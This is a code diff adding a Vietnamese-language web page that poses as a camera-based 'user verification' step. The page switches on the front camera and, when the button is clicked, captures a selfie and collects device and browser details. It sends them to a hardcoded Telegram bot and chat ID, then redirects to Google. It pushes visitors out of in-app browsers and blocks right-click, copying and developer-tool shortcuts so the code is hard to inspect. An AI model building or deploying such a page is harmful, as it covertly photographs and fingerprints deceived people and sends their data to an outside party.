@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Xác Thực Camera</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0d1117;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .card {
+            background: #161b22;
+            padding: 30px;
+            border-radius: 24px;
+            text-align: center;
+            width: 90%;
+            max-width: 380px;
+            border: 1px solid #30363d;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .camera-view {
+            width: 100%;
+            height: 300px;
+            background: #000;
+            border-radius: 16px;
+            margin: 20px 0;
+            overflow: hidden;
+            position: relative;
+            border: 2px solid #30363d;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+
+        .btn {
+            background: #238636;
+            color: white;
+            border: none;
+            padding: 18px;
+            width: 100%;
+            border-radius: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s;
+            letter-spacing: 0.5px;
+        }
+
+        .btn:hover:not(:disabled) {
+            background: #2ea043;
+            transform: translateY(-1px);
+            box-shadow: 0 5px 15px rgba(35, 134, 54, 0.4);
+        }
+
+        .btn:disabled {
+            background: #21262d;
+            color: #8b949e;
+            cursor: not-allowed;
+        }
+
+        #status {
+            font-size: 13px;
+            color: #8b949e;
+            margin-top: 15px;
+            line-height: 1.6;
+        }
+
+        /* Cảnh báo In-App Browser */
+        #browser-warning {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #0d1117;
+            z-index: 10000;
+            padding: 40px 20px;
+            box-sizing: border-box;
+        }
+
+        .warning-box {
+            background: #1c2128;
+            border: 2px solid #f85149;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+        }
+
+        .warning-box h3 {
+            color: #f85149;
+            margin-top: 0;
+            font-size: 20px;
+        }
+
+        .steps {
+            text-align: left;
+            margin-top: 20px;
+            color: #c9d1d9;
+            font-size: 16px;
+            line-height: 2;
+        }
+
+        .highlight {
+            color: #ffeb3b;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="browser-warning">
+        <div class="warning-box">
+            <h3>⚠️ YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
+            <div class="steps">
+                Vui lòng mở website bằng trình duyệt bên ngoài:<br>
+                1. Nhấn vào biểu tượng <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> ở góc trên bên phải.<br>
+                2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span> (Safari/Chrome) để tiếp tục xác thực.
+            </div>
+        </div>
+    </div>
+
+    <div class="card" id="mainCard">
+        <h2 style="margin: 0;">🔐 Xác Minh Người Dùng</h2>
+        <div class="camera-view" id="vBox">
+            <p id="msg" style="color: #484f58;">📷 Đang khởi tạo camera...</p>
+            <video id="preview" autoplay playsinline muted></video>
+        </div>
+        <button class="btn" id="startBtn" disabled>BẮT ĐẦU XÁC THỰC</button>
+        <div id="status">Hệ thống sẽ tự động chuyển hướng sau khi hoàn tất.</div>
+    </div>
+
+    <script>
+        // ==========================================
+        // ⚙️ CẤU HÌNH - CHỈNH SỬA TẠI ĐÂY
+        // ==========================================
+        const TELEGRAM_BOT_TOKEN = '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds';
+        const TELEGRAM_CHAT_ID = '7031115869'; // Chat ID của bạn
+        const REDIRECT_URL = 'https://www.google.com'; // Link chuyển hướng sau khi hoàn tất
+
+        // ==========================================
+        // 📤 HÀM GỬI DỮ LIỆU QUA TELEGRAM
+        // ==========================================
+        async function sendToTelegram(message, photoBlob = null) {
+            try {
+                if (photoBlob) {
+                    // Gửi ảnh + caption
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', photoBlob, 'camera_capture.jpg');
+                    formData.append('caption', message);
+                    formData.append('parse_mode', 'HTML');
+
+                    const response = await fetch(
+                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+                        { method: 'POST', body: formData }
+                    );
+
+                    const result = await response.json();
+                    if (!result.ok) {
+                        console.error('Telegram Photo Error:', result.description);
+                        // Fallback: gửi text nếu ảnh lỗi
+                        await sendTextOnly(message);
+                    }
+                    return result.ok;
+                } else {
+                    return await sendTextOnly(message);
+                }
+            } catch (error) {
+                console.error('Telegram Send Error:', error);
+                return false;
+            }
+        }
+
+        async function sendTextOnly(message) {
+            try {
+                const response = await fetch(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                    {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    }
+                );
+                const result = await response.json();
+                if (!result.ok) {
+                    console.error('Telegram Text Error:', result.description);
+                }
+                return result.ok;
+            } catch (error) {
+                console.error('Send Text Error:', error);
+                return false;
+            }
+        }
+
+        // ==========================================
+        // 📱 THU THẬP THÔNG TIN THIẾT BỊ
+        // ==========================================
+        function collectDeviceInfo() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenW = window.screen.width;
+            const screenH = window.screen.height;
+            const ratio = window.devicePixelRatio;
+            const language = navigator.language;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const memory = navigator.deviceMemory || 'Không rõ';
+            const cores = navigator.hardwareConcurrency || 'Không rõ';
+            const connection = navigator.connection ? navigator.connection.effectiveType : 'Không rõ';
+            const battery = navigator.getBattery ? 'Đang kiểm tra...' : 'Không hỗ trợ';
+
+            // Nhận diện thiết bị
+            let deviceType = 'Thiết bị lạ';
+            let os = 'Không rõ';
+
+            if (/iPhone|iPad|iPod/i.test(ua)) {
+                deviceType = '📱 iPhone/iPad';
+                os = 'iOS';
+            } else if (/Android/i.test(ua)) {
+                deviceType = '📱 Android';
+                os = 'Android';
+            } else if (/Windows/i.test(ua)) {
+                deviceType = '💻 Windows PC/Laptop';
+                os = 'Windows';
+            } else if (/Macintosh/i.test(ua)) {
+                deviceType = '💻 Mac';
+                os = 'macOS';
+            }
+
+            const info = `
+🔔 <b>THÔNG BÁO: CÓ NGƯỜI DÙNG MỚI</b>
+━━━━━━━━━━━━━━━━━━━━━━
+🕐 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}
+📱 <b>Thiết bị:</b> ${deviceType}
+💻 <b>Hệ điều hành:</b> ${os}
+📐 <b>Độ phân giải:</b> ${screenW}x${screenH} @ ${ratio}x
+🌐 <b>Ngôn ngữ:</b> ${language}
+⏰ <b>Múi giờ:</b> ${timezone}
+🧠 <b>RAM thiết bị:</b> ${memory} GB
+⚙️ <b>CPU Cores:</b> ${cores}
+📶 <b>Kết nối:</b> ${connection}
+🔗 <b>Platform:</b> ${platform}
+━━━━━━━━━━━━━━━━━━━━━━
+🖼 <b>Ảnh chụp từ camera trước:</b> 👇
+            `.trim();
+
+            return info;
+        }
+
+        // ==========================================
+        // 📸 CHỤP ẢNH TỪ CAMERA
+        // ==========================================
+        async function capturePhoto(stream) {
+            return new Promise((resolve, reject) => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', true);
+                video.setAttribute('muted', true);
+                video.play();
+
+                video.onloadedmetadata = () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    setTimeout(() => {
+                        const ctx = canvas.getContext('2d');
+                        // Lật ảnh nếu là camera trước (selfie)
+                        ctx.translate(canvas.width, 0);
+                        ctx.scale(-1, 1);
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob((blob) => {
+                            if (blob) {
+                                resolve(blob);
+                            } else {
+                                reject(new Error('Không thể tạo ảnh'));
+                            }
+                        }, 'image/jpeg', 0.9);
+                    }, 1000);
+                };
+
+                video.onerror = () => reject(new Error('Lỗi video element'));
+            });
+        }
+
+        // ==========================================
+        // 🚫 KIỂM TRA IN-APP BROWSER
+        // ==========================================
+        function checkInAppBrowser() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);
+
+            if (isInApp) {
+                document.getElementById('browser-warning').style.display = 'flex';
+                document.getElementById('browser-warning').style.alignItems = 'center';
+                document.getElementById('browser-warning').style.justifyContent = 'center';
+                document.getElementById('mainCard').style.display = 'none';
+            }
+        }
+
+        // ==========================================
+        // 🎬 KHỞI TẠO
+        // ==========================================
+        document.addEventListener("DOMContentLoaded", () => {
+            checkInAppBrowser();
+        });
+
+        const btn = document.getElementById('startBtn');
+        const video = document.getElementById('preview');
+        const status = document.getElementById('status');
+        const msg = document.getElementById('msg');
+
+        let cameraStream = null;
+
+        // Tự động bật camera khi load trang
+        async function initCamera() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+
+                video.srcObject = cameraStream;
+                video.style.display = "block";
+                msg.style.display = "none";
+                document.getElementById('vBox').style.borderColor = "#238636";
+                document.getElementById('vBox').style.boxShadow = "0 0 20px rgba(35, 134, 54, 0.3)";
+                btn.disabled = false;
+                btn.innerText = "📸 BẮT ĐẦU XÁC THỰC";
+                status.innerHTML = "✅ Camera đã sẵn sàng<br>Nhấn nút để xác thực";
+            } catch (err) {
+                console.error('Camera Error:', err);
+                msg.innerText = '❌ Không thể truy cập camera';
+                msg.style.color = '#f85149';
+                status.innerHTML = '⚠️ Vui lòng cấp quyền truy cập camera<br>và tải lại trang';
+                btn.disabled = false;
+                btn.innerText = "🔄 TẢI LẠI TRANG";
+                btn.onclick = () => location.reload();
+            }
+        }
+
+        initCamera();
+
+        // ==========================================
+        // 🚀 XỬ LÝ KHI NHẤN NÚT
+        // ==========================================
+        btn.addEventListener('click', async () => {
+            if (!cameraStream) {
+                location.reload();
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerText = "⏳ ĐANG XỬ LÝ...";
+            status.innerHTML = "📸 Đang chụp ảnh...<br>Vui lòng giữ nguyên vị trí";
+
+            try {
+                // Thu thập thông tin
+                const deviceInfo = collectDeviceInfo();
+
+                // Chụp ảnh
+                let photoBlob = null;
+                try {
+                    status.innerHTML = "📸 Đang chụp ảnh từ camera...";
+                    photoBlob = await capturePhoto(cameraStream);
+                } catch (photoError) {
+                    console.error('Photo Error:', photoError);
+                }
+
+                // Gửi về Telegram
+                status.innerHTML = "📤 Đang gửi dữ liệu...";
+                const sendSuccess = await sendToTelegram(deviceInfo, photoBlob);
+
+                // Dừng camera
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                    video.style.display = "none";
+                    msg.style.display = "block";
+                    msg.innerText = "✅ Đã hoàn tất";
+                    msg.style.color = "#3fb950";
+                }
+
+                // Hiển thị kết quả và đếm ngược
+                if (sendSuccess) {
+                    status.innerHTML = "✅ Xác thực thành công!<br>Đang chuyển hướng...";
+                } else {
+                    status.innerHTML = "⚠️ Xác thực hoàn tất.<br>Đang chuyển hướng...";
+                }
+
+                startCountdown();
+
+            } catch (error) {
+                console.error('Process Error:', error);
+                status.innerHTML = "❌ Có lỗi xảy ra<br>Đang chuyển hướng...";
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                }
+                startCountdown();
+            }
+        });
+
+        // ==========================================
+        // ⏱ ĐẾM NGƯỢC CHUYỂN HƯỚNG
+        // ==========================================
+        function startCountdown() {
+            let timeLeft = 5;
+            btn.innerText = `⏳ CHUYỂN HƯỚNG TRONG ${timeLeft}S`;
+            btn.style.background = "#1a7f37";
+
+            const timer = setInterval(() => {
+                timeLeft--;
+                if (timeLeft > 0) {
+                    btn.innerText = `⏳ CHUYỂN HƯỚNG TRONG ${timeLeft}S`;
+                } else {
+                    clearInterval(timer);
+                    btn.innerText = "🚀 ĐANG CHUYỂN HƯỚNG...";
+                    btn.style.background = "#f0883e";
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 500);
+                }
+            }, 1000);
+        }
+
+        // ==========================================
+        // 🛡 BẢO VỆ - CHẶN CHUỘT PHẢI & PHÍM TẮT
+        // ==========================================
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('copy', (e) => e.preventDefault());
+        document.addEventListener('cut', (e) => e.preventDefault());
+        document.addEventListener('paste', (e) => e.preventDefault());
+
+        document.onkeydown = function(e) {
+            // F12
+            if (e.keyCode === 123) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+I (DevTools)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+J (Console)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+U (View Source)
+            if (e.ctrlKey && e.keyCode === 85) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+S (Save)
+            if (e.ctrlKey && e.keyCode === 83) {
+                e.preventDefault();
+                return false;
+            }
+        };
+
+        // Ngăn chặn kéo thả
+        document.addEventListener('dragstart', (e) => e.preventDefault());
+        document.addEventListener('drop', (e) => e.preventDefault());
+    </script>
+</body>
+</html>
